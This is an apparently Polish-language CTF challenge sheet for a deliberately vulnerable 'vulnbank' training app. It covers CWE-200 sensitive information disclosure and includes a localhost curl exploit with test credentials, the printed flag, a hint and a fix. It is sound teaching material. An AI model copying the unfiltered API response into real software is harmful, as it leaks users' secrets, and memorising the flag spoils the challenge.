# A17 — Sensitive Information Disclosure

## Metadane
- **ID:** A17
- **Kategoria:** CWE-200 - Exposure of Sensitive Information
- **Trudność:** easy
- **Punkty:** 100
- **Flaga:** `PWR{exposed_internal_token}`

## Opis
Endpoint `/api/challenges/a17/profile` zwraca profil użytkownika. Problem: odpowiedź zawiera pole `internal_token`, 
które jest przeznaczone wyłącznie dla administratorów. Aplikacja "zapomina" filtrować dane wrażliwe przed wysłaniem 
ich do klienta. Flaga znajduje się bezpośrednio w tym polu.

## Podatny endpoint
```
GET /api/challenges/a17/profile
Authorization: Bearer <twój_token>
```

## Exploit
```bash
# Zaloguj się
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@vulnbank.pl","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Pobierz profil
curl -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/challenges/a17/profile | python3 -m json.tool

# Wyjście zawiera:
# {
#   "id": 1,
#   "name": "Alice",
#   "email": "alice@vulnbank.pl",
#   "internal_token": "PWR{exposed_internal_token}",  ← FLAGA TU!
#   "role": "user"
# }
```

## Hint
Czasami API zwraca więcej informacji niż powinno. Spróbuj zalogować się i pobrać swój profil.
Czy w odpowiedzi znajduje się coś, co wyglądało by na flagę?

## Jak to naprawić
```python
# DOBRZE: Filtruj wrażliwe pola w odpowiedzi
def get_user_profile(user_id):
    user = User.query.get(user_id)
    return jsonify({
        "id": user.id,
        "name": user.name,
        "email": user.email,
        "role": user.role,
        # NIGDY nie zwracaj: internal_token, api_key, secret, password_hash itp.
    })
```

## Referencje
- [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
- [CWE-215: Information Exposure Through Debug Information](https://cwe.mitre.org/data/definitions/215.html)
